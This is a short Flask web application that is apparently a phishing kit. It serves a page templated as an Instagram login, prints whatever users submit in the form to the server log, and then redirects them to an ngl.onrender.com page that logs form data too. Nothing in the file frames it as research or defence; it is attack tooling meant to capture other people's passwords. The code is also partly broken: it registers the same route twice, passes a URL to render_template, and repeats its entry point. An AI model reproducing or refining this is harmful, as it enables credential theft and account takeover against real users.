from flask import Flask, render_template, request, redirect
import logging

app = Flask("__main__", template_folder="/opt/render/project/src/templates", static_folder="/opt/render/project/src/static")
logging.basicConfig(level=logging.DEBUG)


@app.route("/")
def saanvi_17():
    return render_template("home.html")


@app.route("/abc")
def abc():
    return render_template("Login • Instagram.html")


@app.route("/after")
def after():
    return render_template("https://ngl.onrender.com/after")


@app.route("/abc", methods=["POST", "GET"])
def run_insta_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl.onrender.com/saanvi_17")


@app.route("/saanvi_17", methods=["POST", "GET"])
def run_ngl_code():
    if request.method == "POST":
        print(request.form)
        return redirect("https://ngl.onrender.com/after")


if __name__ == "__main__":
    app.run()


if __name__ == "__main__":
    app.run(host="0.0.0.0")
